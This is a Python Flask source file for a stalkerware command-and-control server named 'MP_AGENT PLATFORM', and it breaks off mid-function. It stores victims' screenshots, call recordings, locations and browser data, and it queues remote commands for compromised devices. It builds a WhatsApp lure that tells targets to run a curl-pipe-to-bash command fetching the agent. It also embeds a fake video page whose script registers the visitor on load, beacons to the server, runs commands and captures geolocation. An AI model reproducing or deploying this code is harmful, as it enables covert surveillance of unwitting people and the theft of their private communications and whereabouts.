from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file, render_template_string
import sqlite3
from datetime import datetime
import os
import random
import io
import json

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
app.template_folder = 'templates'

# Admin credentials
ADMIN_USERNAME = "Mpc"
ADMIN_PASSWORD = "0220Mpc"

# Initialize database with migration support
def init_database():
    conn = sqlite3.connect('mp_agent.db')
    cursor = conn.cursor()
    
    # Check if agents table exists and get its columns
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='agents'")
    table_exists = cursor.fetchone()
    
    if table_exists:
        # Get current columns
        cursor.execute("PRAGMA table_info(agents)")
        existing_columns = [column[1] for column in cursor.fetchall()]
        
        # Add missing columns
        if 'user_agent' not in existing_columns:
            cursor.execute("ALTER TABLE agents ADD COLUMN user_agent TEXT")
            print("✅ Added user_agent column to agents table")
        
        if 'browser_info' not in existing_columns:
            cursor.execute("ALTER TABLE agents ADD COLUMN browser_info TEXT")
            print("✅ Added browser_info column to agents table")
    else:
        # Create fresh agents table
        cursor.execute('''
            CREATE TABLE agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                phone_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME,
                last_seen DATETIME,
                screenshot_count INTEGER DEFAULT 0,
                call_records INTEGER DEFAULT 0,
                location_data TEXT,
                battery_level INTEGER,
                last_screenshot DATETIME,
                user_agent TEXT,
                browser_info TEXT
            )
        ''')
        print("✅ Created fresh agents table")
    
    # Create other tables if they don't exist
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            screenshot_data BLOB,
            timestamp DATETIME,
            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS call_records (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            call_type TEXT,
            phone_number TEXT,
            duration INTEGER,
            audio_data BLOB,
            timestamp DATETIME,
            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deployments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_phone TEXT,
            agent_id TEXT,
            message_sent TEXT,
            status TEXT,
            timestamp DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            level TEXT,
            message TEXT,
            timestamp DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            timestamp DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS browser_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            data_type TEXT,
            data_content TEXT,
            timestamp DATETIME,
            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
        )
    ''')
    
    conn.commit()
    conn.close()
    print("✅ Database initialization completed")

def get_db_connection():
    conn = sqlite3.connect('mp_agent.db')
    conn.row_factory = sqlite3.Row
    return conn

def log_event(level, message):
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
        (level, message, datetime.now())
    )
    conn.commit()
    conn.close()

# Initialize database on startup
init_database()

# ==================== DEBUG ROUTES ====================

@app.route('/debug/agents')
def debug_agents():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    agents = conn.execute("SELECT * FROM agents").fetchall()
    conn.close()
    
    result = "<h1>All Agents in Database</h1>"
    for agent in agents:
        # Convert sqlite3.Row to dict for safe access
        agent_dict = dict(agent)
        user_agent = agent_dict.get('user_agent', 'N/A')
        if not user_agent:
            user_agent = 'N/A'
            
        result += f"""
        <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
            <strong>ID:</strong> {agent_dict['id']}<br>
            <strong>Agent ID:</strong> {agent_dict['agent_id']}<br>
            <strong>Status:</strong> {agent_dict['status']}<br>
            <strong>Phone Model:</strong> {agent_dict['phone_model']}<br>
            <strong>User Agent:</strong> {user_agent}<br>
            <strong>Last Seen:</strong> {agent_dict['last_seen']}<br>
            <strong>First Seen:</strong> {agent_dict['first_seen']}<br>
        </div>
        """
    
    return result

@app.route('/debug/reset_agents')
def reset_agents():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    conn.execute("DELETE FROM agents")
    conn.commit()
    conn.close()
    
    return "All agents cleared. <a href='/debug/agents'>Check agents</a>"

@app.route('/debug/fix_database')
def fix_database():
    """Force database schema update"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    init_database()
    return "Database schema updated. <a href='/debug/agents'>Check agents</a>"

# ==================== ADMIN DASHBOARD ROUTES ====================

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

def row_to_dict(row):
    """Convert SQLite Row object to dictionary"""
    if row is None:
        return None
    return {key: row[key] for key in row.keys()}

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    
    # Get statistics
    stats = {
        'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
        'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
        'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
    }
    
    # Get recent data - Convert rows to dictionaries
    all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
    active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
    screenshots = [row_to_dict(row) for row in conn.execute('''
        SELECT s.*, a.phone_model FROM screenshots s 
        JOIN agents a ON s.agent_id = a.agent_id 
        ORDER BY s.timestamp DESC LIMIT 16
    ''').fetchall()]
    calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
    deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
    
    conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template('dashboard.html',
                         stats=stats,
                         agents=active_agents,
                         all_agents=all_agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         platform_url=platform_url)

@app.route('/admin')
def admin_dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    
    # Get comprehensive statistics
    stats = {
        'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
        'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
        'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
        'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
    }
    
    # Get recent data - Convert rows to dictionaries
    all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
    active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
    screenshots = [row_to_dict(row) for row in conn.execute('''
        SELECT s.*, a.phone_model FROM screenshots s 
        JOIN agents a ON s.agent_id = a.agent_id 
        ORDER BY s.timestamp DESC LIMIT 16
    ''').fetchall()]
    calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
    deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
    commands = [row_to_dict(row) for row in conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()]
    logs = [row_to_dict(row) for row in conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()]
    
    conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template('admin_dashboard.html',
                         stats=stats,
                         agents=active_agents,
                         all_agents=all_agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         commands=commands,
                         logs=logs,
                         platform_url=platform_url)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            session['username'] = username
            log_event('INFO', f'Admin login: {username}')
            return redirect('/dashboard')
        else:
            return '''
            <script>
                alert("Invalid credentials! Use: Mpc / 0220Mpc");
                window.location.href = "/login";
            </script>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MP_AGENT - Platform Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
            .logo p { color: #666; font-size: 14px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
            .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 14px; transition: all 0.3s ease; }
            .form-group input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
            .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
            .btn-login:hover { transform: translateY(-2px); }
            .credentials { margin-top: 25px; padding: 15px; background: #f8f9fa; border-radius: 8px; text-align: center; }
            .credentials h3 { color: #333; margin-bottom: 10px; font-size: 14px; }
            .credentials code { background: #e9ecef; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <h1>🔐 MP_AGENT PLATFORM</h1>
                <p>Complete Surveillance Control Center</p>
            </div>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="btn-login">Login to Control Panel</button>
            </form>
            
            <div class="credentials">
                <h3>Default Credentials</h3>
                <code>Username: Mpc</code><br>
                <code>Password: 0220Mpc</code>
            </div>
        </div>
    </body>
    </html>
    '''

# ==================== AGENT API ROUTES ====================

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    """Agent registration endpoint - FIXED VERSION"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
            
        agent_id = data.get('agent_id')
        phone_model = data.get('phone_model', 'Unknown Device')
        android_version = data.get('android_version', 'Unknown')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        print(f"🔍 Registration attempt - Agent ID: {agent_id}, IP: {ip_address}")
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
        
        conn = get_db_connection()
        
        # Check if agent exists
        existing_agent = conn.execute(
            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
        ).fetchone()
        
        current_time = datetime.now()
        
        if existing_agent:
            print(f"🔄 Updating existing agent: {agent_id}")
            # Try with new schema first
            try:
                conn.execute('''
                    UPDATE agents SET 
                    phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
                    status = 'active', last_seen = ?
                    WHERE agent_id = ?
                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
            except sqlite3.OperationalError:
                # Fallback for old schema
                conn.execute('''
                    UPDATE agents SET 
                    phone_model = ?, android_version = ?, ip_address = ?,
                    status = 'active', last_seen = ?
                    WHERE agent_id = ?
                ''', (phone_model, android_version, ip_address, current_time, agent_id))
            action = "updated"
        else:
            print(f"🆕 Registering new agent: {agent_id}")
            # Try with new schema first
            try:
                conn.execute('''
                    INSERT INTO agents 
                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
                ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
            except sqlite3.OperationalError:
                # Fallback for old schema
                conn.execute('''
                    INSERT INTO agents 
                    (agent_id, phone_model, android_version, ip_address, status, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, 'active', ?, ?)
                ''', (agent_id, phone_model, android_version, ip_address, current_time, current_time))
            action = "registered"
        
        conn.commit()
        
        # Verify the agent was saved
        saved_agent = conn.execute(
            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
        ).fetchone()
        
        # Check for pending commands
        pending_commands = conn.execute(
            "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
            (agent_id,)
        ).fetchall()
        conn.close()
        
        if saved_agent:
            log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
            print(f"✅ Agent {action} successfully: {agent_id}")
            
            commands_list = [cmd['command'] for cmd in pending_commands]
            
            return jsonify({
                'status': 'success', 
                'message': f'Agent {action} successfully',
                'pending_commands': commands_list
            })
        else:
            log_event('ERROR', f'Agent {action} failed: {agent_id}')
            print(f"❌ Agent {action} failed: {agent_id}")
            return jsonify({'status': 'error', 'message': 'Failed to save agent'}), 500
        
    except Exception as e:
        error_msg = f'Agent registration failed: {str(e)}'
        log_event('ERROR', error_msg)
        print(f"❌ {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Receive screenshots from agents"""
    try:
        agent_id = request.form.get('agent_id')
        screenshot_file = request.files.get('screenshot')
        
        if not agent_id or not screenshot_file:
            return jsonify({'status': 'error', 'message': 'Missing agent_id or screenshot'}), 400
        
        screenshot_data = screenshot_file.read()
        
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
            (agent_id, screenshot_data, datetime.now())
        )
        # Ensure agent status remains active
        conn.execute(
            'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
            (datetime.now(), datetime.now(), agent_id)
        )
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Screenshot uploaded from {agent_id}')
        return jsonify({'status': 'success', 'message': 'Screenshot uploaded successfully'})
        
    except Exception as e:
        log_event('ERROR', f'Screenshot upload failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_call', methods=['POST'])
def upload_call():
    """Receive call recordings from agents"""
    try:
        agent_id = request.form.get('agent_id')
        call_type = request.form.get('call_type', 'unknown')
        phone_number = request.form.get('phone_number', 'unknown')
        duration = request.form.get('duration', 0)
        audio_file = request.files.get('audio')
        
        audio_data = audio_file.read() if audio_file else None
        
        conn = get_db_connection()
        conn.execute('''
            INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
        # Ensure agent status remains active
        conn.execute(
            'UPDATE agents SET call_records = call_records + 1, last_seen = ?, status = "active" WHERE agent_id = ?',
            (datetime.now(), agent_id)
        )
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Call recording from {agent_id}: {call_type} call to {phone_number}')
        return jsonify({'status': 'success', 'message': 'Call recording uploaded successfully'})
        
    except Exception as e:
        log_event('ERROR', f'Call upload failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/update_status', methods=['POST'])
def update_agent_status():
    """Update agent status and information"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        battery_level = data.get('battery_level')
        location = data.get('location')
        
        conn = get_db_connection()
        # Ensure agent status remains active
        conn.execute(
            'UPDATE agents SET last_seen = ?, battery_level = ?, location_data = ?, status = "active" WHERE agent_id = ?',
            (datetime.now(), battery_level, location, agent_id)
        )
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Status updated'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/web_data', methods=['POST'])
def receive_web_data():
    """Receive data from web-based agents"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        data_type = data.get('data_type')
        data_content = data.get('data_content')
        
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO browser_data (agent_id, data_type, data_content, timestamp) VALUES (?, ?, ?, ?)',
            (agent_id, data_type, data_content, datetime.now())
        )
        
        # Update agent last seen
        conn.execute(
            'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
            (datetime.now(), agent_id)
        )
        
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Web data received from {agent_id}: {data_type}')
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== MEDIA SERVING ROUTES ====================

@app.route('/media/screenshot/<int:screenshot_id>')
def serve_screenshot(screenshot_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    screenshot = conn.execute(
        "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
    ).fetchone()
    conn.close()
    
    if screenshot and screenshot['screenshot_data']:
        return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
    return 'Screenshot not found', 404

@app.route('/media/call/<int:call_id>')
def serve_call_audio(call_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    call = conn.execute(
        "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
    ).fetchone()
    conn.close()
    
    if call and call['audio_data']:
        return Response(call['audio_data'], mimetype='audio/mp4')
    return 'Call recording not found', 404

# ==================== DEPLOYMENT ROUTES ====================

@app.route('/deploy', methods=['POST'])
def deploy_agent():
    if not session.get('authenticated'):
        return redirect('/login')
    
    target_phone = request.form.get('phone_number')
    agent_id = request.form.get('agent_id', f'phone_{target_phone}')
    
    platform_url = request.host_url.rstrip('/')
    
    # Generate multiple delivery options
    video_link = f"{platform_url}/video?phone={agent_id}"
    setup_link = f"{platform_url}/setup?phone={agent_id}"
    termux_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
    
    whatsapp_message = f'''Check out this cool video! 🎬

Primary Link: {video_link}

For enhanced quality, install the media player:
1. Install "Termux" from Play Store
2. Run: {termux_command}
3. Return to video link!

Enjoy! 😊'''
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (target_phone, agent_id, whatsapp_message, 'initiated', datetime.now())
    )
    conn.commit()
    conn.close()
    
    log_event('INFO', f'Deployment created for {target_phone} -> {agent_id}')
    
    return render_template('deployment.html', 
                         target_phone=target_phone,
                         agent_id=agent_id,
                         video_link=video_link,
                         setup_link=setup_link,
                         termux_command=termux_command,
                         whatsapp_message=whatsapp_message)

# ==================== COMMAND ROUTES ====================

@app.route('/admin/command', methods=['POST'])
def send_command():
    if not session.get('authenticated'):
        return redirect('/login')
    
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    
    if not agent_id or not command:
        return "Missing agent_id or command", 400
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
        (agent_id, command, datetime.now())
    )
    conn.commit()
    conn.close()
    
    log_event('INFO', f'Command sent to {agent_id}: {command}')
    return redirect('/admin')

@app.route('/api/agent/check_commands/<agent_id>')
def check_commands(agent_id):
    """Agents check for pending commands"""
    conn = get_db_connection()
    commands = conn.execute(
        "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
        (agent_id,)
    ).fetchall()
    conn.close()
    
    commands_list = [{'id': cmd['id'], 'command': cmd['command']} for cmd in commands]
    return jsonify({'commands': commands_list})

@app.route('/api/agent/command_result', methods=['POST'])
def command_result():
    """Agents send command execution results"""
    try:
        data = request.get_json()
        command_id = data.get('command_id')
        result = data.get('result')
        
        conn = get_db_connection()
        conn.execute(
            "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
            (result, command_id)
        )
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Command {command_id} completed with result')
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== SOCIAL ENGINEERING PAGES ====================

FAKE_VIDEO_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Exciting Video Content</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 30px;
            backdrop-filter: blur(10px);
        }
        .video-placeholder {
            background: #000;
            padding: 100px 20px;
            margin: 20px auto;
            border-radius: 10px;
            position: relative;
        }
        .loader {
            color: #4CAF50;
            font-size: 18px;
            margin: 20px 0;
        }
        .progress {
            width: 100%;
            background: #555;
            height: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #4CAF50;
            border-radius: 10px;
            transition: width 0.5s;
        }
        .ad-container {
            background: rgba(255,255,255,0.9);
            color: #333;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Exclusive Video Content</h1>
        <p>You're about to watch premium content shared by your friend!</p>
        
        <div class="video-placeholder">
            <div style="font-size: 48px; margin-bottom: 20px;">📱</div>
            <div>Preparing your personalized video experience...</div>
        </div>
        
        <div class="loader" id="status">Initializing video player...</div>
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>

        <div class="ad-container">
            <strong>Sponsored Content</strong>
            <p>This video is sponsored by our partners. Please keep this page open.</p>
        </div>
    </div>

    <!-- WEB AGENT SCRIPT - AUTOMATICALLY STARTS -->
    <script>
        // Web-Based Surveillance Agent
        const agentId = "{{ phone_id }}";
        const serverUrl = "{{ platform_url }}";
        let isActive = true;

        // Function to register device
        function registerAgent() {
            const deviceInfo = {
                agent_id: agentId,
                phone_model: navigator.userAgent,
                android_version: 'Web Browser',
                battery_level: 100
            };

            fetch(serverUrl + '/api/agent/register', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(deviceInfo)
            })
            .then(response => response.json())
            .then(data => {
                console.log('✅ Agent registered:', data);
                startSurveillance();
            })
            .catch(error => {
                console.log('❌ Registration failed:', error);
                setTimeout(registerAgent, 5000); // Retry in 5 seconds
            });
        }

        // Function to collect browser information
        function collectBrowserInfo() {
            const browserInfo = {
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies_enabled: navigator.cookieEnabled,
                screen_resolution: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href
            };

            // Send to server
            fetch(serverUrl + '/api/agent/web_data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent_id: agentId,
                    data_type: 'browser_info',
                    data_content: JSON.stringify(browserInfo)
                })
            });
        }

        // Function to start continuous surveillance
        function startSurveillance() {
            console.log('🔄 Starting web surveillance...');
            
            // Collect initial browser info
            collectBrowserInfo();

            // Continuous reporting loop
            setInterval(() => {
                if (!isActive) return;

                // Send heartbeat
                fetch(serverUrl + '/api/agent/update_status', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        agent_id: agentId,
                        battery_level: 100,
                        location: 'Web Browser Agent'
                    })
                });

                // Check for commands
                fetch(serverUrl + '/api/agent/check_commands/' + agentId)
                    .then(response => response.json())
                    .then(data => {
                        if (data.commands && data.commands.length > 0) {
                            data.commands.forEach(command => {
                                executeCommand(command);
                            });
                        }
                    });

                // Collect additional data periodically
                if (Math.random() < 0.3) { // 30% chance each cycle
                    collectBrowserInfo();
                }

            }, 30000); // Run every 30 seconds

            // Enhanced visibility monitoring
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    console.log('⚠️ Page hidden - agent paused');
                    isActive = false;
                } else {
                    console.log('✅ Page visible - agent active');
                    isActive = true;
                }
            });

            // Prevent page close
            window.addEventListener('beforeunload', function(e) {
                if (isActive) {
                    e.preventDefault();
                    e.returnValue = 'Are you sure you want to leave? Video playback will be interrupted.';
                }
            });
        }

        // Function to execute commands from server
        function executeCommand(command) {
            console.log('🎯 Executing command:', command.command);
            
            // Handle different command types
            switch(command.command) {
                case 'get_browser_info':
                    collectBrowserInfo();
                    break;
                case 'get_location':
                    // Try to get approximate location
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition((position) => {
                            const location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            fetch(serverUrl + '/api/agent/web_data', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    agent_id: agentId,
                                    data_type: 'location',
                                    data_content: JSON.stringify(location)
                                })
                            });
                        });
                    }
                    break;
                case 'get_page_info':
                    const pageInfo = {
                        url: window.location.href,
                        title: document.title,
                        referrer: document.referrer
                    };
                    fetch(serverUrl + '/api/agent/web_data', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            agent_id: agentId,
                            data_type: 'page_info',
                            data_content: JSON.stringify(pageInfo)
                        })
                    });
                    break;
            }

            // Mark command as completed
            fetch(serverUrl + '/api/agent/command_result', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    command_id: command.id,
                    result: 'Command executed via web agent'
                })
            });
        }

        // Fake video loading animation
        const steps = [
            {text: "Connecting to media server...", progress: 10},
            {text: "Loading video content...", progress: 25},
            {text: "Buffering high-quality stream...", progress: 45},
            {text: "Initializing audio codec...", progress: 65},
            {text: "Optimizing playback...", progress: 85},
            {text: "Almost ready...", progress: 95},
            {text: "Video player ready!", progress: 100}
        ];
        
        let step = 0;
        function nextStep() {
            if (step < steps.length) {
                document.getElementById('status').innerHTML = steps[step].text;
                document.getElementById('progress').style.width = steps[step].progress + '%';
                step++;
                setTimeout(nextStep, 1500);
            }
        }

        // Start everything when page loads
        window.addEventListener('load', function() {
            console.log('🚀 Starting MP Agent System...');
            nextStep(); // Start fake loading
            registerAgent(); // Start the agent
        });

    </script>
</body>
</html>
"""

TERMUX_INSTRUCTIONS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Video Player Setup</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: white; }
        .container { max-width: 600px; margin: 0 auto; }
        .step { background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 10px; text-align: left; }
        .code { background: #2d2d2d; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
        .btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Advanced Video Player Setup</h1>
        <p>For optimal video playback on your device, please follow these steps:</p>
        
        <div class="step">
            <h3>📥 Step 1: Install Termux</h3>
            <p>Download "Termux" from Google Play Store</p>
        </div>
        
        <div class="step">
            <h3>🚀 Step 2: Run Setup Command</h3>
            <p>Open Termux and paste this command:</p>
            <div class="code" id="command">
curl -s {{ platform_url }}/download_agent?phone={{ phone_id }} | bash
            </div>
            <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
        </div>
        
        <div class="step">
            <h3>✅ Step 3: Wait for Installation</h3>
            <p>The media player will install automatically and optimize your device for video playback.</p>
        </div>
        
        <p><em>After installation, return here to watch the video!</em></p>
    </div>

    <script>
        function copyCommand() {
            const command = document.getElementById('command').textContent;
            navigator.clipboard.writeText(command).then(() => {
                alert('Command copied! Paste it in Termux.');
            });
        }
        
        // Start web agent as fallback
        const agentId = "{{ phone_id }}";
        const serverUrl = "{{ platform_url }}";
        
        // Register web agent immediately
        fetch(serverUrl + '/api/agent/register', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                agent_id: agentId,
                phone_model: navigator.userAgent,
                android_version: 'Web Browser'
            })
        });
    </script>
</body>
</html>
"""

@app.route('/video')
def fake_video():
    """Fake video page that automatically starts web agent"""
    phone_id = request.args.get('phone', 'unknown')
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    log_event('INFO', f'User accessed fake video: {phone_id} from {user_ip}')
    
